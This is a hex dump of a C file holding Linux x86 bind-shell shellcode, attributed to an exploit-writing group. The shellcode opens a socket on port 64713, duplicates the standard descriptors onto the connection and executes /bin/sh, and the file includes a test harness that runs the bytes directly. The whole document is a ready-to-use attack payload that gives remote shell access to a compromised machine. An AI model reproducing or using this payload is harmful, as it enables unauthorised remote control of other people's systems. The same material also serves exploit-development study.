00000000  2f 2a 0d 0a 20 2a 20 28  6c 69 6e 75 78 2f 78 38  |/*.. * (linux/x8|
00000010  36 29 20 70 6f 72 74 62  69 6e 64 20 2f 62 69 6e  |6) portbind /bin|
00000020  2f 73 68 20 28 70 6f 72  74 20 36 34 37 31 33 29  |/sh (port 64713)|
00000030  0d 0a 20 2a 20 38 33 20  62 79 74 65 73 0d 0a 20  |.. * 83 bytes.. |
00000040  2a 20 0d 0a 20 2a 20 68  74 74 70 3a 2f 2f 77 77  |* .. * http://ww|
00000050  77 2e 67 6f 6e 75 6c 6c  79 6f 75 72 73 65 6c 66  |w.gonullyourself|
00000060  2e 6f 72 67 0d 0a 20 2a  20 73 54 6f 52 6d 20 3c  |.org.. * sToRm <|
00000070  68 69 78 6d 6f 73 74 6f  72 6d 40 68 6f 74 6d 61  |hixmostorm@hotma|
00000080  69 6c 2e 63 6f 6d 3e 0d  0a 20 2a 2f 0d 0a 0d 0a  |il.com>.. */....|
00000090  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
000000a0  20 3d 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  | =..            |
000000b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000c0  20 20 20 20 2f 2f 20 3c  5f 73 74 61 72 74 3e 3a  |    // <_start>:|
000000d0  0d 0a 22 5c 78 36 61 5c  78 36 36 22 20 20 20 20  |.."\x6a\x66"    |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000f0  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 36  |  // push   $0x6|
00000100  36 0d 0a 22 5c 78 35 38  22 20 20 20 20 20 20 20  |6.."\x58"       |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  20 20 20 2f 2f 20 70 6f  70 20 20 20 20 25 65 61  |   // pop    %ea|
00000130  78 0d 0a 22 5c 78 33 31  5c 78 64 62 22 20 20 20  |x.."\x31\xdb"   |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 20 20 2f 2f 20 78 6f  72 20 20 20 20 25 65 62  |   // xor    %eb|
00000160  78 2c 25 65 62 78 0d 0a  22 5c 78 35 33 22 20 20  |x,%ebx.."\x53"  |
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000190  20 20 25 65 62 78 0d 0a  22 5c 78 34 33 22 20 20  |  %ebx.."\x43"  |
000001a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001b0  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 63 20 20  |        // inc  |
000001c0  20 20 25 65 62 78 0d 0a  22 5c 78 35 33 22 20 20  |  %ebx.."\x53"  |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001e0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
000001f0  20 20 25 65 62 78 0d 0a  22 5c 78 36 61 5c 78 30  |  %ebx.."\x6a\x0|
00000200  32 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |2"              |
00000210  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000220  20 20 24 30 78 32 0d 0a  22 5c 78 38 39 5c 78 65  |  $0x2.."\x89\xe|
00000230  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000240  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
00000250  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 22 5c 78  |  %esp,%ecx.."\x|
00000260  63 64 5c 78 38 30 22 20  20 20 20 20 20 20 20 20  |cd\x80"         |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000280  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 22 5c  |int    $0x80.."\|
00000290  78 33 31 5c 78 64 32 22  20 20 20 20 20 20 20 20  |x31\xd2"        |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000002b0  20 78 6f 72 20 20 20 20  25 65 64 78 2c 25 65 64  | xor    %edx,%ed|
000002c0  78 0d 0a 22 5c 78 35 32  22 20 20 20 20 20 20 20  |x.."\x52"       |
000002d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002e0  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 64  |   // push   %ed|
000002f0  78 0d 0a 22 5c 78 36 38  5c 78 66 66 5c 78 30 32  |x.."\x68\xff\x02|
00000300  5c 78 66 63 5c 78 63 39  22 20 20 20 20 20 20 20  |\xfc\xc9"       |
00000310  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000320  63 39 66 63 30 32 66 66  0d 0a 22 5c 78 38 39 5c  |c9fc02ff.."\x89\|
00000330  78 65 31 22 20 20 20 20  20 20 20 20 20 20 20 20  |xe1"            |
00000340  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
00000350  20 20 20 20 25 65 73 70  2c 25 65 63 78 0d 0a 22  |    %esp,%ecx.."|
00000360  5c 78 36 61 5c 78 31 30  22 20 20 20 20 20 20 20  |\x6a\x10"       |
00000370  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000380  2f 20 70 75 73 68 20 20  20 24 30 78 31 30 0d 0a  |/ push   $0x10..|
00000390  22 5c 78 35 31 22 20 20  20 20 20 20 20 20 20 20  |"\x51"          |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  2f 2f 20 70 75 73 68 20  20 20 25 65 63 78 0d 0a  |// push   %ecx..|
000003c0  22 5c 78 35 30 22 20 20  20 20 20 20 20 20 20 20  |"\x50"          |
000003d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003e0  2f 2f 20 70 75 73 68 20  20 20 25 65 61 78 0d 0a  |// push   %eax..|
000003f0  22 5c 78 38 39 5c 78 65  31 22 20 20 20 20 20 20  |"\x89\xe1"      |
00000400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000410  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000420  65 63 78 0d 0a 22 5c 78  38 39 5c 78 63 36 22 20  |ecx.."\x89\xc6" |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000440  20 20 20 20 20 2f 2f 20  6d 6f 76 20 20 20 20 25  |     // mov    %|
00000450  65 61 78 2c 25 65 73 69  0d 0a 22 5c 78 34 33 22  |eax,%esi.."\x43"|
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000470  20 20 20 20 20 20 20 20  20 20 2f 2f 20 69 6e 63  |          // inc|
00000480  20 20 20 20 25 65 62 78  0d 0a 22 5c 78 62 30 5c  |    %ebx.."\xb0\|
00000490  78 36 36 22 20 20 20 20  20 20 20 20 20 20 20 20  |x66"            |
000004a0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 6d 6f 76  |          // mov|
000004b0  20 20 20 20 24 30 78 36  36 2c 25 61 6c 0d 0a 22  |    $0x66,%al.."|
000004c0  5c 78 63 64 5c 78 38 30  22 20 20 20 20 20 20 20  |\xcd\x80"       |
000004d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
000004e0  2f 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |/ int    $0x80..|
000004f0  22 5c 78 62 30 5c 78 36  36 22 20 20 20 20 20 20  |"\xb0\x66"      |
00000500  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000510  2f 2f 20 6d 6f 76 20 20  20 20 24 30 78 36 36 2c  |// mov    $0x66,|
00000520  25 61 6c 0d 0a 22 5c 78  34 33 22 20 20 20 20 20  |%al.."\x43"     |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000540  20 20 20 20 20 2f 2f 20  69 6e 63 20 20 20 20 25  |     // inc    %|
00000550  65 62 78 0d 0a 22 5c 78  34 33 22 20 20 20 20 20  |ebx.."\x43"     |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000570  20 20 20 20 20 2f 2f 20  69 6e 63 20 20 20 20 25  |     // inc    %|
00000580  65 62 78 0d 0a 22 5c 78  63 64 5c 78 38 30 22 20  |ebx.."\xcd\x80" |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 20 20 20 2f 2f 20  69 6e 74 20 20 20 20 24  |     // int    $|
000005b0  30 78 38 30 0d 0a 22 5c  78 35 30 22 20 20 20 20  |0x80.."\x50"    |
000005c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005d0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
000005e0  25 65 61 78 0d 0a 22 5c  78 35 36 22 20 20 20 20  |%eax.."\x56"    |
000005f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000600  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000610  25 65 73 69 0d 0a 22 5c  78 38 39 5c 78 65 31 22  |%esi.."\x89\xe1"|
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000630  20 20 20 20 20 20 2f 2f  20 6d 6f 76 20 20 20 20  |      // mov    |
00000640  25 65 73 70 2c 25 65 63  78 0d 0a 22 5c 78 34 33  |%esp,%ecx.."\x43|
00000650  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000660  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000670  63 20 20 20 20 25 65 62  78 0d 0a 22 5c 78 62 30  |c    %ebx.."\xb0|
00000680  5c 78 36 36 22 20 20 20  20 20 20 20 20 20 20 20  |\x66"           |
00000690  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
000006a0  76 20 20 20 20 24 30 78  36 36 2c 25 61 6c 0d 0a  |v    $0x66,%al..|
000006b0  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006d0  2f 2f 20 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |// int    $0x80.|
000006e0  0a 22 5c 78 39 33 22 20  20 20 20 20 20 20 20 20  |."\x93"         |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000700  20 2f 2f 20 78 63 68 67  20 20 20 25 65 61 78 2c  | // xchg   %eax,|
00000710  25 65 62 78 0d 0a 22 5c  78 36 61 5c 78 30 33 22  |%ebx.."\x6a\x03"|
00000720  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000730  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000740  24 30 78 33 0d 0a 22 5c  78 35 39 22 20 20 20 20  |$0x3.."\x59"    |
00000750  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000760  20 20 20 20 20 20 2f 2f  20 70 6f 70 20 20 20 20  |      // pop    |
00000770  25 65 63 78 0d 0a 20 20  20 20 20 20 20 20 20 20  |%ecx..          |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000790  20 20 20 20 20 20 2f 2f  20 3c 66 72 75 69 74 79  |      // <fruity|
000007a0  5f 6c 6f 6f 70 73 3e 3a  0d 0a 22 5c 78 34 39 22  |_loops>:.."\x49"|
000007b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007c0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 64 65 63  |          // dec|
000007d0  20 20 20 20 25 65 63 78  0d 0a 22 5c 78 36 61 5c  |    %ecx.."\x6a\|
000007e0  78 33 66 22 20 20 20 20  20 20 20 20 20 20 20 20  |x3f"            |
000007f0  20 20 20 20 20 20 20 20  20 20 2f 2f 20 70 75 73  |          // pus|
00000800  68 20 20 20 24 30 78 33  66 0d 0a 22 5c 78 35 38  |h   $0x3f.."\x58|
00000810  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000820  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 6f  |           // po|
00000830  70 20 20 20 20 25 65 61  78 0d 0a 22 5c 78 63 64  |p    %eax.."\xcd|
00000840  5c 78 38 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x80"           |
00000850  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 69 6e  |           // in|
00000860  74 20 20 20 20 24 30 78  38 30 0d 0a 22 5c 78 37  |t    $0x80.."\x7|
00000870  35 5c 78 66 38 22 20 20  20 20 20 20 20 20 20 20  |5\xf8"          |
00000880  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 6a  |            // j|
00000890  6e 65 20 20 20 20 3c 66  72 75 69 74 79 5f 6c 6f  |ne    <fruity_lo|
000008a0  6f 70 73 3e 0d 0a 22 5c  78 66 37 5c 78 65 31 22  |ops>.."\xf7\xe1"|
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 20 20 20 20 20 2f 2f  20 6d 75 6c 20 20 20 20  |      // mul    |
000008d0  25 65 63 78 0d 0a 22 5c  78 35 31 22 20 20 20 20  |%ecx.."\x51"    |
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008f0  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000900  25 65 63 78 0d 0a 22 5c  78 36 38 5c 78 32 66 5c  |%ecx.."\x68\x2f\|
00000910  78 32 66 5c 78 37 33 5c  78 36 38 22 20 20 20 20  |x2f\x73\x68"    |
00000920  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000930  24 30 78 36 38 37 33 32  66 32 66 0d 0a 22 5c 78  |$0x68732f2f.."\x|
00000940  36 38 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |68\x2f\x62\x69\x|
00000950  36 65 22 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |6e"          // |
00000960  70 75 73 68 20 20 20 24  30 78 36 65 36 39 36 32  |push   $0x6e6962|
00000970  32 66 0d 0a 22 5c 78 38  39 5c 78 65 33 22 20 20  |2f.."\x89\xe3"  |
00000980  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000990  20 20 20 20 2f 2f 20 6d  6f 76 20 20 20 20 25 65  |    // mov    %e|
000009a0  73 70 2c 25 65 62 78 0d  0a 22 5c 78 62 30 5c 78  |sp,%ebx.."\xb0\x|
000009b0  30 62 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |0b"             |
000009c0  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
000009d0  20 20 20 24 30 78 62 2c  25 61 6c 0d 0a 22 5c 78  |   $0xb,%al.."\x|
000009e0  63 64 5c 78 38 30 22 20  20 20 20 20 20 20 20 20  |cd\x80"         |
000009f0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000a00  69 6e 74 20 20 20 20 24  30 78 38 30 0d 0a 3b 0d  |int    $0x80..;.|
00000a10  0a 0d 0a 69 6e 74 20 6d  61 69 6e 28 29 20 7b 0d  |...int main() {.|
00000a20  0a 0d 0a 20 20 20 20 69  6e 74 20 28 2a 66 29 28  |...    int (*f)(|
00000a30  29 20 3d 20 28 69 6e 74  28 2a 29 28 29 29 73 68  |) = (int(*)())sh|
00000a40  65 6c 6c 63 6f 64 65 3b  0d 0a 20 20 20 20 70 72  |ellcode;..    pr|
00000a50  69 6e 74 66 28 22 4c 65  6e 67 74 68 3a 20 25 75  |intf("Length: %u|
00000a60  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 73 68 65 6c  |\n", strlen(shel|
00000a70  6c 63 6f 64 65 29 29 3b  0d 0a 20 20 20 20 66 28  |lcode));..    f(|
00000a80  29 3b 0d 0a 20 20 20 20  0d 0a 7d                 |);..    ..}|
00000a8b
